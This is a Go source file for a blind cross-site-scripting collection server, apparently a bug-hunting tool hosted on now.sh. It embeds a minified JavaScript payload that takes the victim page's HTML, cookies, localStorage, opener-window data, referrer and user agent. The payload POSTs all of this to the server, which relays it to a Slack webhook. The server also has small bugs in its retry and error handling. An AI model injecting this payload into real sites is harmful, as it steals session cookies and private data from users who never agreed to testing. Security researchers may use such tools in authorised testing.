package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"log"
)

// Payload is the xss payload used for detection and info-gathering
var payload = `!function(){if("infected"!=window.name){server="{{server}}";if(newxmlhttprequest=function e(n){return n.name in e||(iframe=document.createElement("iframe"),iframe.src="about:blank",iframe.style.display="none",document.body.appendChild(iframe),e[n.name]=iframe.contentWindow[n.name]),e[n.name]}(XMLHttpRequest),xhr=new newxmlhttprequest,xhr.open("POST",server),encode=encodeURIComponent,innerHTML=document.getElementsByTagName("html")[0].innerHTML,href=location.href,cookies=document.cookie,openerlocation=null,openercookies=null,openerhtml=null,localstorage=JSON.stringify(localStorage),referrer=document.referrer,user_agent=navigator.userAgent,opener)try{openerlocation=opener.location.href,openercookies=opener.document.cookie,openerhtml=opener.document.getElementsByTagName("html").innerHTML}catch(e){}urls=[],document.querySelectorAll("script[src]").forEach(function(e){urls.push(e.src)}),urls=urls.toString(),query="",query+="inne="+encode(innerHTML)+"&",query+="durl="+encode(href)+"&",query+="dcoo="+encode(cookies)+"&",query+="oloc="+encode(openerlocation)+"&",query+="odoc="+encode(openercookies)+"&",query+="oloh="+encode(openerhtml)+"&",query+="locs="+encode(localstorage)+"&",query+="jsurls="+encode(urls)+"&",query+="referrer="+encode(referrer)+"&",query+="useragent="+encode(user_agent),xhr.onreadystatechange=function(){document.body.removeChild(iframe)},xhr.send(query)}window.name="infected"}();`

// Host is the domain this server is running on
const Host = "thewidow-<something>.now.sh"

// Handler handles the requests to endpoint
func Handler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		w.Header().Set("Content-Type", "application/javascript")
		fmt.Fprintf(w, "%s", strings.Replace(payload, "{{server}}", fmt.Sprintf("https://%s", Host), -1))
	} else if r.Method == "POST" {
		data, err := ioutil.ReadAll(r.Body)
		if err != nil {
			log.Printf("Could not read body: %v", err)
			return
		}
		r.Body.Close()

		body := string(data)
		processRequest(body, r.RemoteAddr)
	}
}

// ProcessRequest processes a single blind-xss request
func processRequest(body string, RemoteAddr string) {
	q, err := url.ParseQuery(body)
	if err != nil {
		log.Printf("Could not parse query: %v", err)
		return
	}

	values := make(map[string]string)
	for key := range q {
		dataDecoded, err := url.QueryUnescape(q.Get(key))
		if err != nil {
			log.Printf("Could not decode form field: %v", err)
			return
		}
		values[key] = dataDecoded
	}
	values["ip"] = RemoteAddr

	message := newReport(values)
	sendNotificationToSlackDirect(message.string(), os.Getenv("SLACK_WEBHOOK"))
}

// SendNotificationToSlackDirect does what it says
func sendNotificationToSlackDirect(message string, webhook string) {
	message = strings.Replace(message, "\"", "\\\"", -1)
	jsonData := `{"text": "` + message + `"}`
	client := http.Client{}

	req, err := http.NewRequest("POST", webhook, bytes.NewBufferString(jsonData))
	if err != nil {
		log.Printf("Could not send notification: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")

send:
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Could not send notification: %v", err)
	}
	resp.Body.Close()

	if resp.StatusCode == 429 {
		t, err := strconv.Atoi(resp.Header.Get("Retry-After"))
		if err != nil {
			time.Sleep(time.Duration(t) * time.Second)
			goto send
		}
	}
	time.Sleep(1 * time.Second)
}

type xssReport struct {
	InnerHTML    string
	URL          string
	Cookie       string
	OpenerCookie string
	OpenerURL    string
	OpenerHTML   string
	LocalStorage string
	JSUrls       string
	Referrer     string
	UserAgent    string
	IP           string
}

// NewReport creates a new xss report
func newReport(Values map[string]string) xssReport {
	return xssReport{
		InnerHTML:    Values["inne"],
		URL:          Values["durl"],
		Cookie:       Values["dcoo"],
		OpenerCookie: Values["odoc"],
		OpenerURL:    Values["oloc"],
		OpenerHTML:   Values["oloh"],
		LocalStorage: Values["locs"],
		JSUrls:       Values["jsurls"],
		Referrer:     Values["referrer"],
		UserAgent:    Values["useragent"],
		IP:           Values["ip"],
	}
}

// String converts the XSS Report to a textual representation
func (x xssReport) string() string {
	message := "Blind XSS Attempt Received\n"

	message = message + fmt.Sprintf("URL: `%s`\nIP: `%s`\n", x.URL, x.IP)
	if x.Cookie != "" && x.Cookie != "null" {
		message = message + fmt.Sprintf("Cookies: `%s`\n", x.Cookie)
	}
	if x.InnerHTML != "" && x.InnerHTML != "null" {
		message = message + fmt.Sprintf("InnerHTML: \n```\n%s\n```\n", x.InnerHTML)
	}
	if x.OpenerCookie != "" && x.OpenerCookie != "null" {
		message = message + fmt.Sprintf("OpenerCookie: `%s`\n", x.OpenerCookie)
	}
	if x.OpenerURL != "" && x.OpenerURL != "null" {
		message = message + fmt.Sprintf("OpenerURL: `%s`\n", x.OpenerURL)
	}
	if x.OpenerHTML != "" && x.OpenerHTML != "null" {
		message = message + fmt.Sprintf("OpenerHTML: \n```\n%s\n```\n", x.OpenerHTML)
	}
	if x.LocalStorage != "" && x.LocalStorage != "null" && x.LocalStorage != "{}" {
		message = message + fmt.Sprintf("LocalStorage: \n```\n%s\n```\n", x.LocalStorage)
	}
	if x.JSUrls != "" && x.JSUrls != "null" {
		urls := strings.Split(x.JSUrls, ",")
		message = message + fmt.Sprintf("JSUrls: \n```\n")
		for _, url := range urls {
			message = message + fmt.Sprintf("%s\n", url)
		}
		message = message + fmt.Sprintf("```\n")
	}
	if x.Referrer != "" && x.Referrer != "null" {
		message = message + fmt.Sprintf("Referrer: `%s`\n", x.Referrer)
	}
	if x.UserAgent != "" && x.UserAgent != "null" {
		message = message + fmt.Sprintf("User-Agent: `%s`\n", x.UserAgent)
	}

	return message
}
